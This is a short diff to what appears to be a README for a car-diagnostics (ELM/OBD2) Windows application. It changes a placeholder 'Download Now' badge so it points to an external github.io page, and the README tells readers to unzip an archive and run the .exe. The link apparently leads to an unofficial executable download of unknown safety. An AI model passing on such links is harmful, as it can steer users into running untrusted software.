@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://car-scanner-elm-obd2.github.io/.github/)
 
 ## 📸 Overview
 ![car-scanner-elm-dashboard](https://github.com/user-attachments/assets/e5fe1236-0830-4c85-8d23-628c9f7577c1)
